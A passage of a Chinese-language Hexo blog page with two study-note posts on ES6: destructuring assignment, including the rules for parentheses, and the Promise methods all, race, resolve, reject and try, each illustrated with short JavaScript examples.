  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/es6-1/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/12/es6-1/" itemprop="url">es6-1</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T09:54:44+08:00">
                2018-10-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="最近在看es6嘛，就看到了解构赋值那里-毕竟刚开始看没多久"><a href="#最近在看es6嘛，就看到了解构赋值那里-毕竟刚开始看没多久" class="headerlink" title="最近在看es6嘛，就看到了解构赋值那里(毕竟刚开始看没多久)"></a>最近在看es6嘛，就看到了解构赋值那里(毕竟刚开始看没多久)</h4><blockquote>
<p>解构赋值的规则是，只要等号右边的值不是对象或数组，就先将其转为对象，由于undefined和null无法转为对象，所以对它们进行解构赋值，都会报错。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: x &#125; = <span class="literal">undefined</span>; <span class="comment">//TypeError</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: y &#125; = <span class="literal">null</span>; <span class="comment">//TypeError</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>函数参数的解构也可以使用默认值：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params">&#123;x = <span class="number">0</span>, y = <span class="number">0</span>&#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line">move(&#123;<span class="attr">x</span>:<span class="number">3</span>, <span class="attr">y</span>: <span class="number">8</span>&#125;); <span class="comment">// [3, 8]</span></span><br><span class="line">move(&#123;<span class="attr">x</span>:<span class="number">3</span>&#125;); <span class="comment">// [3, 0]</span></span><br><span class="line">move(&#123;&#125;); <span class="comment">// [0, 0]</span></span><br><span class="line">move(); <span class="comment">// [0, 0]</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面的代码中，move的参数是一个对象，通过对这个对象进行解构，得到变量x和y的值，如果解构失败，x和y就等于默认值。<br>注意，下面的写法会得到不一样的结果。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params">&#123;x, y&#125; = &#123;x: <span class="number">0</span>, y: <span class="number">0</span>&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">move(&#123;<span class="attr">x</span>:<span class="number">3</span>,<span class="attr">y</span>:<span class="number">8</span>&#125;); <span class="comment">// [3,8]</span></span><br><span class="line">move(&#123;<span class="attr">x</span>:<span class="number">3</span>&#125;); <span class="comment">// [3,undefined]</span></span><br><span class="line">move(&#123;&#125;); <span class="comment">// [undefined,undefined]</span></span><br><span class="line">move(); <span class="comment">// [0, 0]</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码是为函数move的参数指定默认值，热不是为变量x和y指定默认值，所以会得到与前一种写法不一样的结果。</p>
<p>undefin就会触发函数参数的默认值。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="literal">undefined</span>,<span class="number">3</span>].map(<span class="function">(<span class="params">x = <span class="string">'yes'</span></span>) =&gt;</span> x);</span><br><span class="line"><span class="comment">// [1, 'yes'. 3]</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<h5 id="不能使用圆括号的3种情况："><a href="#不能使用圆括号的3种情况：" class="headerlink" title="不能使用圆括号的3种情况："></a>不能使用圆括号的3种情况：</h5><blockquote>
<p>(1)变量声明语句：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [(a)] = [<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">x</span>: (c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> (&#123;<span class="attr">x</span>: c&#125;) = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x: c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x): c&#125; = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">o</span>: (&#123; <span class="attr">p</span>: p &#125;) &#125; = &#123; <span class="attr">o</span>: &#123; <span class="attr">p</span>: <span class="number">2</span> &#125; &#125;;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面 6 个语句都会报错，因为它们都是变量声明语句，模式不能使用圆括号。</p>
<p>(2)函数参数:<br>函数参数也属于变量声明，因此不能带有圆括号。</p>
<p>(3)赋值语句的模式：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全部报错</span></span><br><span class="line">(&#123; <span class="attr">p</span>: a &#125;) = &#123; <span class="attr">p</span>: <span class="number">42</span> &#125;;</span><br><span class="line">([a]) = [<span class="number">5</span>];</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>上面代码将整个模式放在圆括号之中，导致报错。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line">[(&#123; <span class="attr">p</span>: a &#125;), &#123; <span class="attr">x</span>: c &#125;] = [&#123;&#125;, &#123;&#125;];</span><br></pre></td></tr></table></figure></p>
<p>上面代码将一部分模式放在圆括号之中，导致报错。</p>
<h5 id="可以用圆括号的情况："><a href="#可以用圆括号的情况：" class="headerlink" title="可以用圆括号的情况："></a>可以用圆括号的情况：</h5><blockquote>
<p>可以使用圆括号的情况只有一种：赋值语句的非模式部分，可以使用圆括号。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[(b)] = [<span class="number">3</span>]; <span class="comment">// 正确</span></span><br><span class="line">(&#123; <span class="attr">p</span>: (d) &#125; = &#123;&#125;); <span class="comment">// 正确</span></span><br><span class="line">[(<span class="built_in">parseInt</span>.prop)] = [<span class="number">3</span>]; <span class="comment">// 正确</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面三行语句都可以正确执行，因为首先它们都是赋值语句，而不是声明语句；其次它们的圆括号都不属于模式的一部分。第一行语句中，模式是取数组的第一个成员，跟圆括号无关；第二行语句中，模式是p，而不是d；第三行语句与第一行语句的性质一致。</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/National Day/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/09/National Day/" itemprop="url">National Day</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-09T19:15:08+08:00">
                2018-10-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="Promise实现原理："><a href="#Promise实现原理：" class="headerlink" title="Promise实现原理："></a>Promise实现原理：</h4><blockquote>
<ol>
<li>Promise必须接受一个函数作为参数，称改参数为handle，handle又包含resolve和热reject两个参数，它们是两个函数</li>
<li>Promise状态和值：Promise对象存在以下三种状态：①Pending（进行中）②Fulfilled（已成功）3.Rejected（已失败）；状态只能由Pending变为Fulfilled或由Pending变为Rejected，且状态改变之后不会发生变化，会一直保持这个状态。Promise的值是指状态改变时传递给回调函数的值。resolve和reject两个参数可以用于改变Promise的状态和传入Promise的值。</li>
</ol>
</blockquote>
<h4 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h4><blockquote>
<p>如果作为参数的Promise实例，自己定义了catch方法，那么它一旦被rrejected，并不会触发Promise.all()的catch方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">resolve(<span class="string">'hello'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'报错了'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// ["hello", Error: 报错了]</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码中，p1会resolved，p2首先会rejected，但是p2有自己的catch方法，该方法返回的是一个新的 Promise 实例，p2指向的实际上是这个实例。该实例执行完catch方法后，也会变成resolved，导致Promise.all()方法参数里面的两个实例都会resolved，因此会调用then方法指定的回调函数，而不会调用catch方法指定的回调函数。<br>如果p2没有自己的catch方法，就会调用Promise.all()的catch方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">'hello'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'报错了'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// Error: 报错了</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<h4 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h4><blockquote>
<p>Promise.race方法的参数与Promise.all方法一样，如果不是Promise实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.race([</span><br><span class="line">  fetch(<span class="string">'/resource-that-may-take-a-while'</span>),</span><br><span class="line">  <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'request timeout'</span>)), <span class="number">5000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">p</span><br><span class="line">.then(<span class="built_in">console</span>.log)</span><br><span class="line">.catch(<span class="built_in">console</span>.error);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码中，如果 5 秒之内fetch方法无法返回结果，变量p的状态就会变为rejected，从而触发catch方法指定的回调函数。</p>
</blockquote>
<h4 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h4><blockquote>
<p>有时需要将现有对象转为 Promise 对象，Promise.resolve方法就起到这个作用。</p>
</blockquote>
<h5 id="Promise-resolve-方法的参数分成四种情况："><a href="#Promise-resolve-方法的参数分成四种情况：" class="headerlink" title="Promise.resolve()方法的参数分成四种情况："></a>Promise.resolve()方法的参数分成四种情况：</h5><blockquote>
<p>（1）参数是一个 Promise 实例如果参数是 Promise 实例，那么Promise.resolve将不做任何修改、原封不动地返回这个实例。<br>（2）参数是一个thenable对象thenable对象指的是具有then方法的对象，比如下面这个对象。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> thenable = &#123;</span><br><span class="line">  then: <span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>Promise.resolve方法会将这个对象转为 Promise 对象，然后就立即执行thenable对象的then方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> thenable = &#123;</span><br><span class="line">  then: <span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="built_in">Promise</span>.resolve(thenable);</span><br><span class="line">p1.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);  <span class="comment">//42</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码中，thenable对象的then方法执行后，对象p1的状态就变为resolved，从而立即执行最后那个then方法指定的回调函数，输出 42。<br>（3）参数不是具有then方法的对象，或根本就不是对象如果参数是一个原始值，或者是一个不具有then方法的对象，则Promise.resolve方法返回一个新的 Promise 对象，状态为resolved。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve(<span class="string">'Hello'</span>);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span> (<span class="params">s</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Hello</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码生成一个新的 Promise 对象的实例p。由于字符串Hello不属于异步操作（判断方法是字符串对象不具有 then 方法），返回 Promise 实例的状态从一生成就是resolved，所以回调函数会立即执行。Promise.resolve方法的参数，会同时传给回调函数。<br>（4）不带有任何参数Promise.resolve方法允许调用时不带参数，直接返回一个resolved状态的 Promise 对象。所以，如果希望得到一个 Promise 对象，比较方便的方法就是直接调用Promise.resolve方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve();</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码的变量p就是一个 Promise 对象。<br>需要注意的是，立即resolve的 Promise 对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'three'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'two'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'one'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// one</span></span><br><span class="line"><span class="comment">// two</span></span><br><span class="line"><span class="comment">// three</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码中，setTimeout(fn, 0)在下一轮“事件循环”开始时执行，Promise.resolve()在本轮“事件循环”结束时执行，console.log(‘one’)则是立即执行，因此最先输出。</p>
</blockquote>
<h4 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h4><blockquote>
<p>Promise.reject(reason)方法也会返回一个新的 Promise 实例，该实例的状态为rejected。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.reject(<span class="string">'出错了'</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(<span class="string">'出错了'</span>))</span><br><span class="line"></span><br><span class="line">p.then(<span class="literal">null</span>, <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 出错了</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码生成一个 Promise 对象的实例p，状态为rejected，回调函数会立即执行。<br>注意，Promise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数。这一点与Promise.resolve方法不一致。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> thenable = &#123;</span><br><span class="line">  then(resolve, reject) &#123;</span><br><span class="line">    reject(<span class="string">'出错了'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.reject(thenable)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e === thenable)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码中，Promise.reject方法的参数是一个thenable对象，执行以后，后面catch方法的参数不是reject抛出的“出错了”这个字符串，而是thenable对象。</p>
</blockquote>
<h4 id="Promise-try"><a href="#Promise-try" class="headerlink" title="Promise.try()"></a>Promise.try()</h4><blockquote>
<p>Promise.resolve().then(f),这种写法有一个缺点，就是如果f是同步函数，那么它会在本轮事件循环的末尾执行。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// next</span></span><br><span class="line"><span class="comment">// now</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码中，函数f是同步的，但是用 Promise 包装了以后，就变成异步执行了。<br>用两种写法是可以让同步函数同步执行，异步函数异步执行，并且让它们具有统一的API：<br>第一种：async<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; f())();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now </span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码中，第二行是一个立即执行的匿名函数，会立即执行里面的async函数，因此如果f是同步的，就会得到同步的结果；如果f是异步的，就可以用then指定下一步，就像下面的写法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; f())()</span><br><span class="line">.then(...)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>async () =&gt; f()会吃掉f()抛出的错误。所以，如果想捕获错误，要使用promise.catch方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; f())()</span><br><span class="line">.then(...)</span><br><span class="line">.catch(...)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>第二种： new Promise() :<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line">(</span><br><span class="line">  () =&gt; <span class="keyword">new</span> <span class="built_in">Promise</span>(</span><br><span class="line">    resolve =&gt; resolve(f())</span><br><span class="line">  )</span><br><span class="line">)();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>上面代码也是使用立即执行的匿名函数，执行new Promise()。这种情况下，同步函数也是同步执行的。<br>其实可以用Promise.try方法代替上面的写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line"><span class="built_in">Promise</span>.try(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>可以统一用promise.catch()捕获所有同步和异步的错误。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.try(database.users.get(&#123;<span class="attr">id</span>: userId&#125;))</span><br><span class="line">  .then(...)</span><br><span class="line">  .catch(...)</span><br></pre></td></tr></table></figure></p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
